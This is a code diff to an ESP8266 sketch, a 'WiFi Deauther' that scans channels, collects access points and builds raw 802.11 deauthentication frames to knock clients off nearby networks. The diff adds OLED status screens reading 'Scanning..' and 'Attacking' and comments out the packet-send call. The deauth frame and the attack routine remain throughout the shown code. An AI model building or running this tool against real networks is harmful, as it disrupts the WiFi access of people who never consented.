@@ -1,4 +1,3 @@
-
 #ifdef ESP8266
 extern "C" {
 #include "ets_sys.h"
@@ -9,6 +8,25 @@ extern "C" {
 #include "user_interface.h"
 }
 #endif
+
+//////////////////////////////////////////// OLED Shield
+#include <SPI.h>
+#include <Wire.h>
+#include <Adafruit_GFX.h>
+#include <Adafruit_SSD1306.h>
+
+// SCL GPIO5
+// SDA GPIO4
+#define OLED_RESET 0  // GPIO0
+Adafruit_SSD1306 display(OLED_RESET);
+
+#define LOGO16_GLCD_HEIGHT 16
+#define LOGO16_GLCD_WIDTH  16
+
+#if (SSD1306_LCDHEIGHT != 48)
+#error("Height incorrect, please fix Adafruit_SSD1306.h!");
+#endif
+//////////////////////////////////////////// OLED Shield
 
 // this idea worked
 // FOR REMOVING ARRAY ITEM..
@@ -90,6 +108,8 @@ class AccessPoint
     int channel;
     int packet_limit = 500;
     int channels[14] = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}; // ARRAY TO HELP DETERMINE ACTIVE CHANNEL
+    // ARRAY TO STORE CLIENTS
+    // int clients[20][6] = {};
     // THANKS spacehuhn
     uint8_t deauthPacket[26] = {
       /*  0 - 1  */ 0xC0, 0x00, //type, subtype c0: deauth (a0: disassociate)
@@ -108,12 +128,11 @@ void send_deauth(AccessPoint access_point)
 {
   // SET CHANNEL TO AP CHANNEL
   wifi_set_channel(access_point.channel);
-  delay(1); // NEED THIS DELAY OR PACKET WILL NOT SEND PROPERLY
+  delay(1);
   
   // SEND DEAUTH PACKET
-  wifi_send_pkt_freedom(access_point.deauthPacket, 26, 0);
+  //wifi_send_pkt_freedom(access_point.deauthPacket, 26, 0);
 }
-
 
 // FUNCTION TO ADD NEW APs TO THE MASTER LIST OF APs
 bool add_access_point(uint8_t bssid[6], int channel, String essid, signed rssi)
@@ -366,6 +385,13 @@ void ICACHE_FLASH_ATTR promisc_cb(uint8 *buf, uint16 len)
 // FUNCTION TO SHOW THE DEAUTH PACKETS THAT WILL BE TRANSMITTED
 void show_deauth()
 {
+  display.clearDisplay();
+  display.setCursor(0,0);
+  display.println("\nAttacking");
+  display.print("APs: ");
+  display.print(current + 1);
+  display.display();
+  
   Serial.print("Deauthenticating clients from ");
   Serial.print(current + 1);
   Serial.println(" access points");
@@ -423,6 +449,14 @@ void scan()
     {
       set_channel = channels[p];
       wifi_set_channel(set_channel);
+      
+      display.clearDisplay();
+      display.setCursor(0,0);
+      display.println("\nScanning..");
+      display.print("Ch: ");
+      display.println(channels[p]);
+      display.display();
+      
       delay(1000);
     }
     Serial.println("[!] Completed one scan");
@@ -437,6 +471,17 @@ void scan()
 void setup() {
   //pinMode(LED_BUILTIN, OUTPUT);
   //digitalWrite(LED_BUILTIN, LOW);
+  delay(2000);
+  display.begin(SSD1306_SWITCHCAPVCC, 0x3C); 
+  display.setCursor(0,0);
+  display.setTextColor(WHITE);
+  display.clearDisplay();
+  display.display();
+  display.println("\n  Deauth");
+  display.println("   All");
+  display.display();
+  delay(3000);
+  
   Serial.begin(2000000);
   Serial.println("[!] WiFi Deauther");
   Serial.println("[!] Initializing...\n\n");
